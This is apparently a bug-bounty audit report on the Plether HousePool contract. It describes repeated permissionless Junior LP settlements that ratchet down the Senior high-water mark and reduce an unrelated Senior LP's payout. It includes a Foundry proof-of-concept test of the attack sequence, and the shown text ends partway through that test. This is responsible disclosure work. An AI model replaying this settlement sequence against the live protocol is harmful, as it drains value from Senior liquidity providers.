# \#99025 [SC-High] Permissionless Junior LP settlements ratchet down Senior recovery and reduce an unrelated LP's final payout

**Submitted on Nov 11th 2026 at 13:47:00 UTC by @Rrudy for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99025
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

The pinned [accounting specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L329-L340) makes `seniorHighWaterMark` the entitlement that future Pool revenue must restore after a loss. A loss does not lower that mark, and surplus should reach Junior only after Senior recovery. Public PR #122 also says its correction preserves the full-intent high-water mark. Following a terminal loss in the test, the owner performs the documented `recapitalizePool(21,520.341732 USDG)` and `clearDegradedMode` recovery calls. The first public LP settlement records the full `21,520.341732` USDG recapitalization intent as Senior HWM, with `3,000` USDG Senior principal and `18,520.341732` USDG pending recapitalization.

An external Junior holder can then request redemption of all its zero-current-value shares, call permissionless `OrderRouter.settleLpEpoch` at maturity, claim the refunded shares, and repeat. Each qualifying pass through `HousePool._reconcile` reserves the still-pending recapitalization against equity previously credited to Senior. `HousePoolReconcilePlanLib.planReconcile` consequently sees a shortfall and removes existing Senior principal. `HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent` takes its empty-principal bootstrap and **assigns the smaller remaining recapitalization intent** to `seniorHighWaterMark`. The first five extra settlements lower HWM from `21,520.341732` to `4,120.341612` USDG; the sixth leaves it there. Extra settlements two through five lower it with the same mark and Pool cash, without a new loss or Senior share burn. `pendingTradingRevenueAssets` is zero at each reset.

The PoC takes one post-recap state snapshot and compares two continuations. A has six additional Junior-triggered LP settlements. B advances through the same times and marks without them. Before the later trades, the test asserts equal Pool cash, mark, timestamp, and both tranche share supplies. Each branch then has the **same `18,001.462870` USDG Pool cash inflow** from public trading. The passive `SENIOR_LP`, with half of Senior supply, publicly redeems and actually receives `2,060.170805` USDG in A versus `10,050.731550` USDG in B, **`7,990.560745` USDG less**. In both branches, that LP ends with zero Senior shares in its wallet, zero pending, claimable, and refundable Senior shares, and zero claimable Senior assets. The discrepancy is a completed payout, not a delayed claim.

The PoC also measures the **entire external Junior economic actor**, assuming control of both `JUNIOR_LP` and `JUNIOR_HOLDER`. The holder triggers the repeated settlements and receives `161.019882` USDG in A versus zero in B. The other Junior address claims an earlier refundable request, then uses public `requestRedeem`, `settleLpEpoch`, and `claimRedeem` to receive **another `15,304.941325` USDG in A versus zero in B**. Across those two controlled wallets, the same-time A−B incremental *realized cash* is **`+15,465.961207` USDG**. This cash increment is not a dollar-for-dollar transfer of the one Senior LP's `7,990.560745` USDG reduction. Other Senior ownership, Pool cash, seed shares, and residual Junior rights remain. It is also not a lifetime or gas-adjusted profit claim.

The Junior actor's two addresses had deposited `500,000 + 1,000 = 501,000` USDG before the loss. `JUNIOR_LP` had already received `402,742.681478` USDG from a partial exit in both branches. The controlled wallets end with `418,208.642685` USDG cash in A and `402,742.681478` in B: **A is `82,791.357315` USDG below the initial deposits**, while B is `98,257.318522` below. A also has `2,205,159,527,901` unsettled Junior shares with a `354.354178` USDG current quote after a no-progress settlement attempt; this is not cash and is excluded. B has `97,444,910,506,519` refundable Junior shares currently quoted at zero. Their *future* withdrawal option is not proved worthless. The separately locked owner seed shares are not attacker-controlled and are excluded from both wallets.

The selected mock-EVM operations consume an estimated `5,910,351` gas in A versus `898,199` in B, an incremental `5,012,152` gas that includes one failed no-progress settlement attempt. This excludes intrinsic transaction gas, Arbitrum L1 data fees, signed Pyth update fees, external keeper/Hermes costs, and the gas-to-USDG exchange rate. Actual fee-adjusted cash gain is unknown. The PoC does not establish that the controlled Junior position can be entered or retained at an economic cost below its conditional cash benefit, or that the synthetic loss and later trading path occurs in live signed-market conditions.

This is an incomplete-fix candidate related to public Cecuro MED-12. [PR #122](https://github.com/Plether-Fi/plether-core/pull/122) describes a stale `allowRevenueContinuation` decision that misassigned **same-batch pending trading revenue** after recapitalization; its correction recomputes that decision after applying the pending recapitalization. This test's first failing transition is instead the **later repeated reservation and empty-principal bootstrap HWM assignment** across separate LP settlements in [`HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111-L122); `pendingTradingRevenueAssets == 0` at those resets. The PR noted that no production Engine caller recording recapitalization had then been found. At the pinned commit, the documented owner recovery call [`CfdEngine.recapitalizePool`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L627-L653) records `Recapitalization/CashArrived`, and this PoC uses that route before permissionless LP settlements. The PR also discusses preserving a full-intent HWM and residual buckets. These code and call-path differences support review of an incomplete fix but do not independently resolve the competition's public-root-cause or prior-disclosure rules.

The release-style fixture uses the six published basket feed IDs, weights, inversion flags, and risk limits with **unsigned synthetic `MockPyth` prices**, not historical signed FX updates. The wipe path moves the basket approximately `1.00→0.40/1.60` at different times, roughly a 60% move; the later profit-to-Pool scenario moves about `0.40→1.90`. The test proves conditional accounting and wallet effects under that path. It does not measure how often real six-feed signed data could create it. The owner uses documented recovery calls, and no trusted actor is assumed malicious.

Suggested remediation: preserve the full-intent Senior HWM for the same outstanding Senior supply across repeated reconciliations when no new loss or Senior redemption occurred. Track how much pending recapitalization has already been attributed to Senior so later LP settlements cannot reserve and bootstrap it again. A regression should assert unchanged HWM after an extra mature LP settlement with unchanged Pool cash, mark, and Senior shares.

## Proof of Concept

Pin the public repository and submodules to `a82d4fefb02768e5b3bddcc97dee371eee24fea8` and verify `git rev-parse HEAD` in that clone before running the PoC. Save Appendices A, B, and C below in one directory as `SeniorHwmSixFeed.t.sol`, `run_poc_isolated.sh`, and `patch_sixfeed_fixture.py`. Run Appendix B with `MED12_SOURCE_ROOT=/path/to/pinned/clone MED12_RUN_NAME=review01 bash run_poc_isolated.sh` from a credential-free Linux/WSL shell with Forge 1.5.1, Solidity 0.8.35, Python 3, and `bwrap`; set `MED12_FORGE_BIN`, `MED12_SOLC_BIN`, `MED12_BWRAP_BIN`, or `MED12_DEPS_ROOT` if those tools or public dependencies are elsewhere. The runner copies the public source into disposable scratch, patches only scratch `BasePerpTest.sol` to install the six-feed mock and production `OrderRouter`, then runs Foundry with `--offline` inside `bwrap --unshare-user --unshare-pid --unshare-net --clearenv`. It never changes in-scope `packages/perps/src` or sends a public-chain transaction. All three required files are included below.

The test deposits Junior and Senior liquidity through the public vault flow, creates the loss with public `OrderRouter` orders and synthetic feed updates, and invokes the owner's documented recapitalization and degraded-mode clearance. It snapshots after the first public LP settlement. A uses six full-share Junior refunds and additional settlements; B advances through identical timestamps and marks. The test asserts equal pre-revenue cash, mark, time, and supplies, and equal subsequent `18,001.462870` USDG trading inflow. Both branches publicly settle and claim the victim's Senior redemption and both Junior addresses' available value. `_claim` compares actual USDG `balanceOf` before and after the claim with the return amount. The second A settlement attempt on the residual Junior request makes no progress; its `354.354178` USDG quote remains excluded from cash. B is advanced to the same final timestamp. Separate tests pay the trader claim first and verify a public bootstrap without an owner configuration change.

Expected result: the three Appendix A tests pass, including the A/B Senior wallet-receipt and HWM assertions. The runner prints its exit status and retains the complete Forge output locally for the reviewer. The inline source below is the evidence to reproduce; no separate log directory or archive is needed.

| Measured USDG or selected EVM gas | A: extra settlements | B: control |
| --- | ---: | ---: |
| Senior HWM before later revenue | 4,120.341612 | 21,520.341732 |
| Later trading cash inflow to Pool | 18,001.462870 | 18,001.462870 |
| Unrelated Senior LP final USDG wallet receipt | 2,060.170805 | 10,050.731550 |
| `JUNIOR_HOLDER` final USDG wallet | 161.019882 | 0 |
| `JUNIOR_LP` final USDG wallet, including prior exit | 418,047.622803 | 402,742.681478 |
| Combined controlled Junior wallet USDG | 418,208.642685 | 402,742.681478 |
| Selected EVM gas estimate | 5,910,351 | 898,199 |

The table compares actual wallet receipts at the same final timestamp after a common loss and recapitalization; it does not value residual shares or external execution costs.

### Appendix A — `SeniorHwmSixFeed.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Six-feed synthetic-price A/B for the pinned production contracts. The runner patches only
// the scratch BasePerpTest oracle fixture and deploys production OrderRouter; packages/perps/src is unchanged.

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {HousePoolEngineViewTypes} from "@plether/perps/interfaces/HousePoolEngineViewTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

contract SeniorHwmSixFeedTest is BasePerpTest {
    address internal constant SENIOR_LP = address(0xB0B); // victim: ordinary Senior LP
    address internal constant JUNIOR_LP = address(0xA11CE); // ordinary Junior LP that exits before the loss
    address internal constant JUNIOR_HOLDER = address(0xA77AC0); // Junior LP that stays through the loss
    address internal constant TRADER = address(0xC0A01);
    address internal constant TRADER_2 = address(0xC0A02);
    address internal constant TRADER_3 = address(0xD1203);
    address internal constant REVENUE_TRADER = address(0xC1A0DE);
    address internal constant KEEPER = address(0xB0A7D); // permissionless caller

    uint256 internal constant ENTRY_PRICE = 1e8;
    uint256 internal constant LOW = 40_000_000;
    uint256 internal constant HIGH = 160_000_000;
    uint256 internal constant SIZE = 100_000e18;

    uint256 internal constant ROUNDS = 6;
    uint256 internal constant ROUND_STEP = 4 hours;
    uint256 internal constant ROUND_SETTLE_OFFSET = 150 minutes;

    struct TerminalRights {
        uint256 seniorPaid;
        uint256 seniorWalletShares;
        uint256 seniorPendingShares;
        uint256 seniorClaimableShares;
        uint256 seniorClaimableAssets;
        uint256 seniorRefundableShares;
        uint256 juniorPaid;
        uint256 juniorWalletShares;
        uint256 juniorPendingShares;
        uint256 juniorClaimableShares;
        uint256 juniorClaimableAssets;
        uint256 juniorRefundableShares;
        uint256 juniorRefundableCurrentAssets;
    }

    TerminalRights private lastTerminalRights;
    uint256 private initialJuniorRedeemId;
    uint256 private attackerGasEstimate;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// Release parameters named on the competition page: maintenance 0.1%, initial 0.2%,
    /// Senior cap 40M USDG and 80% of the pool. Each change goes through the owner timelock helpers.
    function setUp() public override {
        super.setUp();
        CfdTypes.RiskParams memory risk = _riskParams();
        risk.vpiFactor = 0.01e18;
        risk.maintMarginBps = 10;
        risk.initMarginBps = 20;
        _setRiskParams(risk);
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.adverseConfidenceMultiplierBps = 2500;
        routerConfig.minOpenNotionalAssets = 1_000e6;
        routerConfig.maxPendingOrders = 5;
        // Same as BasePerpTest._setRouterConfig, but reads the cheatcode clock so the 72h timelock
        // is measured from the warped time under via-IR.
        routerAdmin.proposeRouterConfig(routerConfig);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        routerAdmin.finalizeRouterConfig();
        _setSeniorCapacity(40_000_000e6, 8000);
        (uint256 vpi, uint256 maxSkew, uint256 maint, uint256 initial, uint256 fad,,,,,) = engine.riskParams();
        assertEq(vpi, 0.01e18, "vpi factor");
        assertEq(maxSkew, 0.4e18, "release max skew ratio");
        assertEq(maint, 10, "maintenance margin 0.1%");
        assertEq(initial, 20, "initial margin 0.2%");
        assertEq(fad, 300, "release FAD margin");
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer");
        assertEq(engine.CAP_PRICE(), 2e8, "release cap price");
        assertEq(router.minOpenNotionalAssets(), 1_000e6, "release min open notional");
        assertEq(router.maxPendingOrders(), 5, "release max pending orders");
        assertEq(pool.maxSeniorShareBps(), 8000, "Senior share cap 80%");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "Senior cap 40M");
        assertEq(engine.executionFeeBps(), 4, "execution fee 0.04%");
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500, "release oracle confidence");
    }

    // ------------------------------------------------------------------ public-path helpers

    function _order(CfdTypes.Side side, bool close, uint256 size, uint256 margin, uint256 target, bytes32 tag)
        private
        view
        returns (OrderV3Types.OrderRequest memory r)
    {
        r.clientOrderId = tag;
        r.side = side;
        r.isClose = close;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.targetPrice = target;
        r.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _execute(address account, OrderV3Types.OrderRequest memory r, uint256 price) private {
        vm.prank(account);
        uint64 id = router.commitOrder(r);
        bytes[] memory tick = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, tick);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "public order executed");
    }

    function _freshMark(uint256 price) private returns (bytes[] memory tick) {
        tick = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.updateMarkPrice(tick);
    }

    function _deposit(TrancheVault vault, address lp, uint256 assets) private returns (uint256 shares) {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        uint256 id = vault.requestDeposit(assets, lp);
        vm.stopPrank();
        uint256 epochStart = pool.lpEpochStart(id);
        if (vm.getBlockTimestamp() < epochStart) vm.warp(epochStart);
        bytes[] memory tick = _mockPythUpdateData(ENTRY_PRICE);
        vm.prank(KEEPER);
        router.settleLpEpoch(tick);
        emit log_named_uint("DEPOSIT_SETTLE_OK", 1);
        shares = vault.claimableDepositShares(id, lp);
        vm.prank(lp);
        vault.claimDeposit(id, assets, lp, lp);
        assertEq(vault.balanceOf(lp), shares, "LP shares delivered");
    }

    function _claim(TrancheVault vault, address lp) private returns (uint256 paid) {
        uint256 id = vault.controllerRedeemHead(lp);
        if (id == 0) return 0;
        uint256 shares = vault.claimableRedeemRequest(id, lp);
        if (shares == 0) return 0;
        uint256 beforeWallet = settlementToken.balanceOf(lp);
        vm.prank(lp);
        paid = vault.claimRedeem(id, shares, lp, lp);
        assertEq(settlementToken.balanceOf(lp) - beforeWallet, paid, "actual LP wallet payout");
    }

    /// Ordinary LP exits before the loss (Junior LP keeps 1 share atom, Senior LP keeps 1e12 shares).
    function _lpExit(uint256 juniorShares, uint256 seniorShares) private {
        vm.warp(vm.getBlockTimestamp() + 3601);
        bytes[] memory markTick = _mockPythUpdateData(ENTRY_PRICE);
        vm.prank(KEEPER);
        router.updateMarkPrice(markTick);
        vm.prank(SENIOR_LP);
        uint256 seniorId = seniorVault.requestRedeem(seniorShares, SENIOR_LP, SENIOR_LP);
        vm.prank(JUNIOR_LP);
        uint256 juniorId = juniorVault.requestRedeem(juniorShares, JUNIOR_LP, JUNIOR_LP);
        initialJuniorRedeemId = juniorId;
        uint256 start = pool.lpEpochStart(seniorId);
        if (pool.lpEpochStart(juniorId) > start) start = pool.lpEpochStart(juniorId);
        if (vm.getBlockTimestamp() < start) vm.warp(start);
        bytes[] memory exitTick = _mockPythUpdateData(ENTRY_PRICE);
        vm.prank(KEEPER);
        router.settleLpEpoch(exitTick);
        emit log_named_uint("EXIT_SETTLE_OK", 1);
        _claim(seniorVault, SENIOR_LP);
        _claim(juniorVault, JUNIOR_LP);
        vm.warp(vm.getBlockTimestamp() + 1);
        _logJuniorWealth("JUNIOR_WEALTH_AFTER_INITIAL_EXIT");
    }

    /// Terminal equity available to LP claimants (positive part) and its shortfall (negative part).
    function _equity() private view returns (uint256 distributable, uint256 shortfall) {
        HousePoolEngineViewTypes.HousePoolInputSnapshot memory snap =
            engineProtocolLens.getHousePoolInputSnapshot(pool.markStalenessLimit());
        uint256 assets = snap.physicalAssets;
        uint256 liabilities = snap.traderClaimBalanceAssets;
        if (snap.terminalLpPriceDeltaAssets >= 0) assets += uint256(snap.terminalLpPriceDeltaAssets);
        else liabilities += uint256(-snap.terminalLpPriceDeltaAssets);
        if (assets >= liabilities) distributable = assets - liabilities;
        else shortfall = liabilities - assets;
    }

    function _log(string memory tag) private {
        (uint256 distributable,) = _equity();
        emit log_string(tag);
        emit log_named_uint("  timestamp", vm.getBlockTimestamp());
        emit log_named_uint("  mark", engine.lastMarkPrice());
        emit log_named_decimal_uint("  poolCash", pool.totalAssets(), 6);
        emit log_named_uint("  Senior share supply", seniorVault.totalSupply());
        emit log_named_uint("  Junior share supply", juniorVault.totalSupply());
        emit log_named_decimal_uint("  seniorHighWaterMark", pool.seniorHighWaterMark(), 6);
        emit log_named_decimal_uint("  seniorPrincipal", pool.seniorPrincipal(), 6);
        emit log_named_decimal_uint("  juniorPrincipal", pool.juniorPrincipal(), 6);
        emit log_named_decimal_uint("  unassignedAssets", pool.unassignedAssets(), 6);
        emit log_named_decimal_uint("  pendingRecapitalizationAssets", pool.pendingRecapitalizationAssets(), 6);
        emit log_named_decimal_uint("  pendingTradingRevenueAssets", pool.pendingTradingRevenueAssets(), 6);
        emit log_named_decimal_uint("  distributable equity", distributable, 6);
    }

    /// One ordinary LP redemption request for a zero-value share, then a permissionless settlement.
    function _requestAndSettle(uint256 markPrice) private {
        vm.prank(JUNIOR_LP);
        uint256 id = juniorVault.requestRedeem(1, JUNIOR_LP, JUNIOR_LP);
        if (vm.getBlockTimestamp() < pool.lpEpochStart(id)) vm.warp(pool.lpEpochStart(id));
        bytes[] memory tick = _freshMark(markPrice);
        assertEq(pool.pendingTradingRevenueAssets(), 0, "no pending trading revenue is involved");
        vm.prank(JUNIOR_HOLDER);
        router.settleLpEpoch(tick);
        emit log_named_uint("FIRST_RECAP_SETTLE_OK", 1);
        assertEq(juniorVault.refundableRedeemRequest(id, JUNIOR_LP), 1, "zero-asset request is refunded");
        vm.prank(JUNIOR_LP);
        juniorVault.claimRedeemRefund(id, JUNIOR_LP, JUNIOR_LP);
        assertEq(juniorVault.balanceOf(JUNIOR_LP), 1, "requester share returned");
    }

    // ------------------------------------------------------------------ scenario

    /// Reaches recovery through public Router/LP calls plus owner recapitalization and degraded-mode clearing.
    /// No Pool config proposal/finalization is needed.
    function _reachRecoveryState() private returns (uint256 recap) {
        uint256 juniorShares = _deposit(juniorVault, JUNIOR_LP, 500_000e6);
        uint256 seniorShares = _deposit(seniorVault, SENIOR_LP, 250_000e6);
        _deposit(juniorVault, JUNIOR_HOLDER, 1_000e6);
        assertGt(juniorVault.balanceOf(JUNIOR_HOLDER), 1, "holder owns Junior shares");
        _fundTrader(TRADER, 5_000e6);
        _fundTrader(TRADER_2, 100_000e6);
        _fundTrader(TRADER_3, 10_000e6);
        _execute(TRADER, _order(CfdTypes.Side.LONG, false, SIZE, 2_000e6, 1, keccak256("t1-open")), ENTRY_PRICE);
        _execute(
            TRADER_2,
            _order(CfdTypes.Side.SHORT, false, SIZE, 80_000e6, engine.CAP_PRICE(), keccak256("t2-open")),
            ENTRY_PRICE
        );
        _execute(
            TRADER_3,
            _order(CfdTypes.Side.SHORT, false, 1_000e18, 2_000e6, engine.CAP_PRICE(), keccak256("t3-open")),
            ENTRY_PRICE
        );
        _lpExit(juniorShares - 1, seniorShares - 1e12);
        _execute(TRADER, _order(CfdTypes.Side.LONG, true, SIZE, 0, engine.CAP_PRICE(), keccak256("t1-close")), LOW);
        _execute(TRADER_2, _order(CfdTypes.Side.SHORT, true, SIZE, 0, 1, keccak256("t2-close")), HIGH);
        emit log_named_decimal_uint("unpaid trader claim", engine.traderClaimBalanceAssets(TRADER_2), 6);
        emit log_named_decimal_uint("pool cash after the loss", pool.totalAssets(), 6);
        assertGt(engine.traderClaimBalanceAssets(TRADER_2), pool.totalAssets(), "trader claim exceeds pool cash");

        _freshMark(ENTRY_PRICE);
        emit log_named_uint("OWNER_CONFIG_CHECKPOINT", 0);
        _log("STATE before owner recapitalization");
        (, uint256 shortfall) = _equity();
        recap = shortfall + 3_000e6;
        assertGt(recap, shortfall, "partial recap has positive distributable equity");
        emit log_named_decimal_uint("equity shortfall before recapitalization", shortfall, 6);
        emit log_named_decimal_uint("owner recapitalization P", recap, 6);
        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap); // owner
        if (engine.degradedMode()) engine.clearDegradedMode(); // owner

        _requestAndSettle(ENTRY_PRICE); // first public settlement after the recapitalization
        _log("STATE after first public recap settlement");
    }

    function _rounds(bool settle, uint256 base) private {
        for (uint256 i = 0; i < ROUNDS; ++i) {
            vm.warp(base + i * ROUND_STEP);
            if (!settle) {
                vm.warp(base + i * ROUND_STEP + ROUND_SETTLE_OFFSET);
                _freshMark(LOW);
                continue;
            }
            uint256 holderShares = juniorVault.balanceOf(JUNIOR_HOLDER);
            assertGt(holderShares, 0, "beneficiary has shares to request");
            vm.prank(JUNIOR_HOLDER);
            uint256 beforeGas = gasleft();
            uint256 id = juniorVault.requestRedeem(holderShares, JUNIOR_HOLDER, JUNIOR_HOLDER);
            attackerGasEstimate += beforeGas - gasleft();
            vm.warp(base + i * ROUND_STEP + ROUND_SETTLE_OFFSET);
            bytes[] memory tick = _freshMark(LOW);
            assertLe(pool.lpEpochStart(id), vm.getBlockTimestamp(), "epoch matured");
            uint256 pendingBefore = pool.pendingRecapitalizationAssets();
            assertEq(pool.pendingTradingRevenueAssets(), 0, "no pending trading revenue is involved");
            vm.prank(JUNIOR_HOLDER);
            beforeGas = gasleft();
            router.settleLpEpoch(tick);
            attackerGasEstimate += beforeGas - gasleft();
            emit log_named_uint("ROUND_SETTLE_OK", 1);
            assertEq(seniorVault.totalSupply(), 2e12, "no Senior share burned by this settlement");
            assertEq(juniorVault.refundableRedeemRequest(id, JUNIOR_HOLDER), holderShares,
                "beneficiary's full zero-value request is refundable");
            vm.prank(JUNIOR_HOLDER);
            beforeGas = gasleft();
            juniorVault.claimRedeemRefund(id, JUNIOR_HOLDER, JUNIOR_HOLDER);
            attackerGasEstimate += beforeGas - gasleft();
            assertEq(juniorVault.balanceOf(JUNIOR_HOLDER), holderShares,
                "beneficiary retains shares for repeat trigger and eventual benefit");
            emit log_named_uint("settlement", i + 2);
            emit log_named_decimal_uint("  pending recap before", pendingBefore, 6);
            emit log_named_decimal_uint("  seniorHighWaterMark after", pool.seniorHighWaterMark(), 6);
            emit log_named_decimal_uint("  seniorPrincipal after", pool.seniorPrincipal(), 6);
            _log("ROUND_SETTLED");
        }
    }

    /// Ordinary trading revenue: losing round trips by an unrelated trader.
    function _tradingRevenue(uint256 openPrice, uint256 closePrice, uint256 rounds, uint256 funding,
        uint256 tradeSize) private {
        _fundTrader(REVENUE_TRADER, funding);
        uint256 cashBefore = pool.totalAssets();
        for (uint256 i = 0; i < rounds; ++i) {
            _freshMark(openPrice);
            _execute(
                REVENUE_TRADER,
                _order(CfdTypes.Side.LONG, false, tradeSize, 5_000e6, 1, keccak256(abi.encode("rev-open", i))),
                openPrice
            );
            _execute(
                REVENUE_TRADER,
                _order(CfdTypes.Side.LONG, true, tradeSize, 0, engine.CAP_PRICE(), keccak256(abi.encode("rev-close", i))),
                closePrice
            );
        }
        emit log_named_decimal_uint("trading revenue cash into the pool", pool.totalAssets() - cashBefore, 6);
    }

    /// Senior LP and the Junior holder redeem everything; returns actual wallet receipts.
    function _redeemAll(uint256 price, string memory tag) private returns (uint256 seniorPaid, uint256 juniorPaid) {
        _execute(TRADER_3, _order(CfdTypes.Side.SHORT, true, 1_000e18, 0, 1, keccak256("t3-close")), price);
        vm.warp(vm.getBlockTimestamp() + 3601);
        uint256 seniorHeld = seniorVault.balanceOf(SENIOR_LP);
        vm.prank(SENIOR_LP);
        uint256 sid = seniorVault.requestRedeem(seniorHeld, SENIOR_LP, SENIOR_LP);
        uint256 juniorHeld = juniorVault.balanceOf(JUNIOR_HOLDER);
        vm.prank(JUNIOR_HOLDER);
        uint256 beforeGas = gasleft();
        uint256 jid = juniorVault.requestRedeem(juniorHeld, JUNIOR_HOLDER, JUNIOR_HOLDER);
        attackerGasEstimate += beforeGas - gasleft();
        uint256 start = pool.lpEpochStart(sid);
        if (pool.lpEpochStart(jid) > start) start = pool.lpEpochStart(jid);
        if (vm.getBlockTimestamp() < start) vm.warp(start);
        for (uint256 round = 0; round < 4; ++round) {
            if (round > 0) vm.warp(vm.getBlockTimestamp() + 3601);
            bytes[] memory tick = _mockPythUpdateData(price);
            vm.prank(KEEPER);
            (bool ok, bytes memory revertData) = address(router).call(abi.encodeWithSignature("settleLpEpoch(bytes[])", tick));
            emit log_named_string("REDEEM_BRANCH", tag);
            emit log_named_uint("REDEEM_SETTLE_ROUND", round);
            emit log_named_uint("REDEEM_SETTLE_OK", ok ? 1 : 0);
            if (round == 0) assertTrue(ok, "first redemption settlement must succeed");
            else assertFalse(ok, "later redemption settlement must have no progress");
            if (!ok) {
                assertGe(revertData.length, 4, "settlement revert has selector");
                bytes4 selector;
                assembly { selector := mload(add(revertData, 32)) }
                assertEq(selector, IHousePool.HousePool__NoLpEpochProgress.selector,
                    "only expected no-progress settlement may fail");
            }
            if (round == 0) _log(tag);
            seniorPaid += _claim(seniorVault, SENIOR_LP);
            beforeGas = gasleft();
            juniorPaid += _claim(juniorVault, JUNIOR_HOLDER);
            attackerGasEstimate += beforeGas - gasleft();
        }
        emit log_named_decimal_uint("  Senior LP wallet received", seniorPaid, 6);
        emit log_named_decimal_uint("  Junior holder wallet received", juniorPaid, 6);
        lastTerminalRights = TerminalRights({
            seniorPaid: seniorPaid,
            seniorWalletShares: seniorVault.balanceOf(SENIOR_LP),
            seniorPendingShares: seniorVault.pendingRedeemRequest(sid, SENIOR_LP),
            seniorClaimableShares: seniorVault.claimableRedeemRequest(sid, SENIOR_LP),
            seniorClaimableAssets: seniorVault.claimableRedeemAssets(sid, SENIOR_LP),
            seniorRefundableShares: seniorVault.refundableRedeemRequest(sid, SENIOR_LP),
            juniorPaid: juniorPaid,
            juniorWalletShares: juniorVault.balanceOf(JUNIOR_HOLDER),
            juniorPendingShares: juniorVault.pendingRedeemRequest(jid, JUNIOR_HOLDER),
            juniorClaimableShares: juniorVault.claimableRedeemRequest(jid, JUNIOR_HOLDER),
            juniorClaimableAssets: juniorVault.claimableRedeemAssets(jid, JUNIOR_HOLDER),
            juniorRefundableShares: juniorVault.refundableRedeemRequest(jid, JUNIOR_HOLDER),
            juniorRefundableCurrentAssets: juniorVault.convertToAssets(
                juniorVault.refundableRedeemRequest(jid, JUNIOR_HOLDER))
        });
        _logTerminalRights(tag, lastTerminalRights);
        _logJuniorWealth(tag);
    }

    function _logJuniorWealth(string memory tag) private {
        emit log_named_string("JUNIOR_WEALTH_STAGE", tag);
        emit log_named_decimal_uint("JUNIOR_LP_WALLET_USDG", settlementToken.balanceOf(JUNIOR_LP), 6);
        emit log_named_decimal_uint("JUNIOR_HOLDER_WALLET_USDG", settlementToken.balanceOf(JUNIOR_HOLDER), 6);
        emit log_named_decimal_uint("SEED_RECEIVER_WALLET_USDG", settlementToken.balanceOf(address(this)), 6);
        emit log_named_uint("JUNIOR_LP_WALLET_SHARES", juniorVault.balanceOf(JUNIOR_LP));
        emit log_named_uint("JUNIOR_HOLDER_WALLET_SHARES", juniorVault.balanceOf(JUNIOR_HOLDER));
        emit log_named_uint("SEED_RECEIVER_WALLET_SHARES", juniorVault.balanceOf(address(this)));
        emit log_named_uint("JUNIOR_LP_HEAD", juniorVault.controllerRedeemHead(JUNIOR_LP));
        emit log_named_uint("JUNIOR_LP_INITIAL_REQUEST_ID", initialJuniorRedeemId);
        emit log_named_uint("JUNIOR_LP_INITIAL_PENDING_SHARES", juniorVault.pendingRedeemRequest(initialJuniorRedeemId, JUNIOR_LP));
        emit log_named_uint("JUNIOR_LP_INITIAL_CLAIMABLE_SHARES", juniorVault.claimableRedeemRequest(initialJuniorRedeemId, JUNIOR_LP));
        emit log_named_decimal_uint("JUNIOR_LP_INITIAL_CLAIMABLE_USDG", juniorVault.claimableRedeemAssets(initialJuniorRedeemId, JUNIOR_LP), 6);
        emit log_named_uint("JUNIOR_LP_INITIAL_REFUNDABLE_SHARES", juniorVault.refundableRedeemRequest(initialJuniorRedeemId, JUNIOR_LP));
        emit log_named_decimal_uint("JUNIOR_LP_INITIAL_REFUNDABLE_VALUE", juniorVault.convertToAssets(juniorVault.refundableRedeemRequest(initialJuniorRedeemId, JUNIOR_LP)), 6);
        emit log_named_decimal_uint("JUNIOR_LP_WALLET_SHARE_VALUE", juniorVault.convertToAssets(juniorVault.balanceOf(JUNIOR_LP)), 6);
        emit log_named_decimal_uint("SEED_RECEIVER_WALLET_SHARE_VALUE", juniorVault.convertToAssets(juniorVault.balanceOf(address(this))), 6);
        emit log_named_uint("ATTACKER_RATCHET_GAS_ESTIMATE", attackerGasEstimate);
    }

    function _realizeJuniorLp(uint256 price, string memory tag) private returns (uint256 paid) {
        uint256 refundShares = juniorVault.refundableRedeemRequest(initialJuniorRedeemId, JUNIOR_LP);
